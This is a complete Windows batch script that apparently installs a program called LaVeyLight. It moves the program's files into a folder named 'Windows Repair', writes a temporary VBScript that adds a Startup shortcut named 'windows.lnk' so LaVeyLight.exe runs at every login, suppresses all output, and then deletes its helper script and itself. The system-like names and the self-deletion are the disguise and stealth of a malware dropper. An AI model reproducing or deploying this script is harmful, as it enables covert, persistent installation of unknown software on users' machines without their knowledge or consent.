@echo off
SET FOLDER=%HOMEDRIVE%\Windows Repair
RMDIR /s /q "%FOLDER%" 1>NUL 2>NUL
MOVE "%~dp0LaVeyLightFiles" "%FOLDER%" 1>NUL 2>NUL
ECHO Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
ECHO sLinkFile = "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\windows.lnk" >> CreateShortcut.vbs
ECHO Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
ECHO oLink.TargetPath = "%FOLDER%\LaVeyLight.exe" >> CreateShortcut.vbs
ECHO oLink.Save >> CreateShortcut.vbs 
cscript CreateShortcut.vbs 1>NUL 2>NUL
DEL CreateShortcut.vbs 1>NUL 2>NUL
cls
start /b "" cmd /c del "%~f0"&exit /b
